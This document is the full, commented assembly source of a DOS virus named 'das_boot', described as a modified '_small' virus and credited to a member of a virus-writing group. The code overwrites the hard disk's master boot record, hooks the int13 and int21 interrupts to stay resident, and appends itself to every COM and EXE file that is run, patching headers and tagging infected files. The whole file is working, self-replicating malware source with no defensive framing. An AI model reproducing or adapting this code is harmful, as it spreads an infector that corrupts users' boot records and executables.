;=============================================================================
; FILE:         das_boot.a86   
; DESCRIPTION:  _small virus modified into mulipartite COM/EXE infector
; THANKS TO:    Dark Angel of Phalcon/Skism
;=============================================================================

boot            equ     07b00     ;delta offset for boot-time location
com             equ     0100      ;delta offset for resident location
EXE_id          equ     -040      ;EXE infection tag
viruslength     equ     01a7      ;length of virus = 423 bytes

das_boot:                                                                       
        call    relative                                                        

oldheader       db      0CD, 020  ;*(00) EXE file signature     | COM file's
                dw      ?         ;*(02) # of bytes in last page| 1st 3 bytes
                dw      ?         ;*(04) size of file + header (pages)
                dw      ?         ; (06) # of relocation items
                dw      ?         ; (08) size of header (paragraphs)
                dw      ?         ; (0A) min paragraphs needed
                dw      ?         ; (0C) max paragraphs needed
                dw      ?         ;*(0E) ss displacement from entry in para.
                dw      ?         ;*(10) sp value at entry
                dw      ?         ; (12) checksum
                dw      ?         ;*(14) ip value at entry
                dw      ?         ;*(16) cs displacement from entry in para.
                                  ;* - indicates value modified by das_boot
relative:                                                                       
        pop     bp                      ;pop offset of oldheader off of stack
        sub     bp,03                   ;adjust offset to start of program
        mov     ax,cs                   ;load ax with current segment
        mov     cl,04                   ;load cx with multiplier/shift value 
        shl     ax,cl                   ;calculate absolute segment
        mov     si,bp                   ;load si with program offset
        add     si,ax                   ;calculate absolute address
        cmp     si,07c00                ;code executing at boot-time address?
        jne     infect_mbr              ;if not, must be executing from file,
                                        ;  so attempt to infect MBR
        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point ds to vector table

        push    si                      ;save 0000:07c00 on stack as load  
        push    ds                      ; location for original MBR

        dec     word ptr [0413]         ;decrease conventional memory by 1KB
        int     012                     ;load ax with #KB of conv. memory
        mov     cx,0106                 ;load move (100) and shift (06) values
        shl     ax,cl                   ;calculate destination segment

        mov     es,ax                   ;set es to destination segment
        mov     [022*4+2],ax            ;store boot tag in int22 vector seg.
        xchg    [013*4+2],ax            ;point int13 vector to virus segment
        mov     [offset old13+boot+2],ax ;store old int13 segment value
        mov     ax,offset int13-com     ;load ax with virus int13 handler off.
        xchg    [013*4],ax              ;point int13 vector to virus offset
        mov     [offset old13+boot],ax  ;store old int13 offset value
  
        xor     di,di                   ;set destination offset=0000
        cld                             ;clear direction flag (fwd)
        rep     movsw                   ;move virus to top of conv. memory

        push    es                      ;push destination segment for retf
        mov     ax,offset top_mem-com   ;load ax with offset
        push    ax                      ;push offset for retf
        retf                            ;return to self at new location
top_mem:
        pop     es                      ;pop es=0000 as disk load segment
        mov     ax,0201                 ;select read-one-sector function
        pop     bx                      ;pop bx=07c00 as disk load offset
        mov     cl,02                   ;cylinder 0, sector 2 (original MBR)
                                        ;head 0, drive "C"
        int     013                     ;load original MBR

        jmp     0000:07c00              ;jump to execute original MBR

infect_mbr:
        push    ds                      ;preserve registers
        push    es

        push    cs                      
        pop     ds                      ;set ds=cs
        push    cs
        pop     es                      ;set es=cs

        mov     ax,0201                 ;select read-one-sector function
        lea     bx,[bp+viruslength]     ;set load offset just beyond program
        mov     cx,01                   ;cylinder 0, sector 1 (MBR)
        mov     dx,080                  ;head 0, drive "C"
        int     013                     ;load MBR
        jb      exit_small              ;if flag=error, exit
                                        

        cmp     [bx],018e8              ;check for das_boot code
        je      exit_small              ;if equal, MBR already infected, so
                                        ; exit
        mov     ax,0301                 ;select write-one-sector function
        inc     cx                      ;cylinder 0, sector 2
        int     013                     ;relocate original MBR to sector 2

        mov     si,bp                   ;set source offset to start of virus
        mov     di,bx                   ;set dest. offset to MBR in buffer
        mov     cx,viruslength          ;load move count to cx
        rep     movsb                   ;move virus to MBR in memory

        mov     ax,0301                 ;select write-one-sector function
        inc     cx                      ;cylinder 0, sector 1 (MBR)
        int     013                     ;write infected MBR to drive "C"
exit_small:                                                                     
        pop     es                      ;restore segment registers to point     
        pop     ds                      ; to PSP                                

        add     bp,03                   ;reset bp to point to oldheader

        or      sp,sp                   ;test parity of stack pointer        
        jpo     returnCOM               ;if value is odd, COM file is host
returnEXE:                                                                      
        mov     ax,ds                   ;load ax with PSP segment
        add     ax,010                  ;adjust segment value to skip PSP
        add     [bp+016],ax             ;restore orig. cs value in oldheader
        add     ax,[bp+0e]              ;calculate original ss entry value   
        mov     ss,ax                   ;load ss with original value         
        mov     sp,cs:[bp+010]          ;load sp with program entry value
        jmp     dword ptr cs:[bp+014]   ;jump to EXE file entry point via
                                        ; restored value in oldheader
returnCOM:                                                                      
        mov     di,0100                 ;COM file entry point & move dest.
        push    di                      ;save on stack as return offset 
        mov     si,bp                   ;point to stored COM 1st three bytes
        movsw                           ;move the original three bytes
        movsb                           ; back to the start of the COM file
        ret                             ;return to execute the COM file
                                        ; (return segment already on stack)
int13:
        push    ax                      ;preserve registers
        push    ds

        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point ds to vector table

        push    cs
        pop     ax                      ;set ax=cs

        cmp     [090*4],ax              ;bypass flag set?
        je      exit_int13              ;if so, don't steal int21 vector again

        cmp     [022*4+2],ax            ;int22 vector segment = boot tag?
        je      exit_int13              ;if so, vectors not fully initialized,
                                        ; so don't steal int21 yet
        mov     [090*4],ax              ;put bypass flag in unused BASIC vect.

        mov     ax,offset int21-com     ;load ax with virus int21 handler off.
        xchg    [021*4],ax              ;point int21 vector to virus offset
        mov     cs:[offset old21-com],ax ;store orig. int21 handler offset
        mov     ax,cs                   ;load ax with virus int21 handler seg.
        xchg    [021*4+2],ax            ;point int21 vector to virus segment
        mov     cs:[offset old21-com+2],ax ;store orig. int21 handler segment
exit_int13:
        pop     ds                      ;restore registers
        pop     ax

        db      0ea                     ;"jmp far" to location specified in
old13:                                  ; old13
        dw      ?, ?                    ;offset and segment of original int13
                                        ; handler
infect:                                                                         
        push    ax                      ;preserve registers
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        mov     ax,03d02                ;open file read/write function
        int     021                     ;attempt to open file read/write
        xchg    ax,bx                   ;save file handle in bx                 

        push    cs                                                              
        pop     ds                      ;set ds=cs                              
        push    cs                                                              
        pop     es                      ;set es=cs                              

        mov     si,offset oldheader-com ;point to offset of oldheader

        mov     ah,03f                  ;read file function
        mov     cx,018                  ;first 18 bytes
        push    cx                      ;save value for later use        
        mov     dx,si                   ;point to oldheader offset
        int     021                     ;load file's 1st 18 bytes to oldheader

        cmp     ax,cx                   ;18 bytes successfully read?            
        jne     go_already_infected     ;if not, open file read/write failed,
                                        ; so exit         

        mov     di,offset target-com    ;point to target offset
        push    di                      ;save offset value for later use      
        rep     movsb                   ;move oldheader to target (cx=18)
        pop     di                      ;restore di to target offset value  

        mov     ax,04202                ;move file pointer, offset from EOF
        cwd                             ;set dx=0000 (LSP) [cx=0000 (MSP)]
        int     021                     ;move file pointer to EOF, dx:ax 
                                        ; returned as new file pointer
        cmp     ds:[di],'ZM'            ;check target header for EXE tag       
        je      infectEXE               ;if present, infect EXE                

infectCOM:
        sub     ax,03                   ;subtract 3 from file pointer offset
        mov     byte ptr ds:[di],0e9    ;put "jmp" at start of target header
        mov     ds:[di+01],ax           ;put jmp offset in target header

        sub     ax,viruslength          ;calc. jmp offset of infected file    
        cmp     ds:[si-017],ax          ;does file's jmp offset match?
        jne     finishinfect            ;if not, it's not infected, so infect  
go_already_infected:                                                            
        pop     cx                      ;discard excess value on stack          
        jmp     short already_infected  ;exit infection routine                 

int21:                                                                          
        cmp     ax,04b00                ;load and execute file request?
        je      infect                  ;if so, attempt to infect file
        jmp     short chain             ;if not, jump to orig. int21 handler    

infectEXE:                                                                      
        cmp     word ptr [di+010],EXE_id ;check for infect tag in target SP
        je      go_already_infected      ;if tag is present, don't infect       

        push    ax                      ;push file pointer LSP                  
        push    dx                      ;push file pointer MSP                  

        add     ax,viruslength          ;add virus length to file length (LSP)  
        adc     dx,0                    ;adjust MSP (segment) to reflect        
                                        ; any carry from adjustment of LSP
        mov     cx,0200                 ;set cx=1 page (512d bytes)
        div     cx                      ;divide new file length by 512d to      
                                        ; calculate number of pages in file
        or      dx,dx                   ;remainder in dx?                       
        jz      nohiccup                ;if not, no need to add another page
        inc     ax                      ;add another page to length value       
nohiccup:                                                                       
        mov     ds:[di+04],ax           ;store # of pages in target header
        mov     ds:[di+02],dx           ;store # of bytes in last page in
                                        ; target header
        pop     dx                      ;restore dx to file pointer MSP         
        pop     ax                      ;restore ax to file pointer LSP         

        mov     cx,010                  ;convert dx:ax to
        div     cx                      ; segment(ax):offset(dx) form

        sub     ax,ds:[di+08]           ;subtract header size

        mov     ds:[di+014],dx          ;store new entry ip in target
        mov     ds:[di+016],ax          ;store new entry cs displacement

        mov     ds:[di+0e],ax           ;store new entry ss displacement
        mov     word ptr ds:[di+010],EXE_id ;store EXE_id as sp in target
finishinfect:                                                                   
        mov     ah,040                  ;write to file w/handle function
        mov     cx,viruslength          ;specify # of bytes to write            
        xor     dx,dx                   ;set buffer start at virus offset    
        int     021                     ;write _small to EOF

        mov     ax,04200                ;move file pointer, offset from BOF
        xor     cx,cx                   ;MSP of offset cx=0000
        cwd                             ;LSP of offset dx=0000
        int     021                     ;move file pointer to BOF

        mov     ah,040                  ;write to file w/handle function
        mov     dx,di                   ;set buffer start at target header
        pop     cx                      ;specify 18 bytes to write              
        int     021                     ;write modified EXE header (or COM 
                                        ; jmp xxxx & next 15 bytes) to BOF
already_infected:                                                               
        mov     ah,03e                  ;close file w/handle function
        int     021                     ;close file
exitinfect:                                                                     
        pop     es                      ;preserve registers
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax

chain:                                                                          
                db      0ea     ;"jmp far" to location specified in old21
heap:                                                                           

old21           dw      ?, ?    ;offset and segment of orig. int21 handler

target          dw      ?       ;*(00) EXE file signature     | COM file's
                dw      ?       ;*(02) # of bytes in last page| jmp to virus
                dw      ?       ;*(04) size of file + header (pages)       
                dw      ?       ; (06) # of relocation items               
                dw      ?       ; (08) size of header (paragraphs)         
                dw      ?       ; (0A) min paragraphs needed               
                dw      ?       ; (0C) max paragraphs needed               
                dw      ?       ;*(0E) ss displacement from entry in para. 
                dw      ?       ;*(10) sp value at entry                   
                dw      ?       ; (12) checksum                            
                dw      ?       ;*(14) ip value at entry                   
                dw      ?       ;*(16) cs displacement from entry in para. 
                                ;* - indicates value modified by das_boot  
endheap:                                                                        

        end     das_boot
        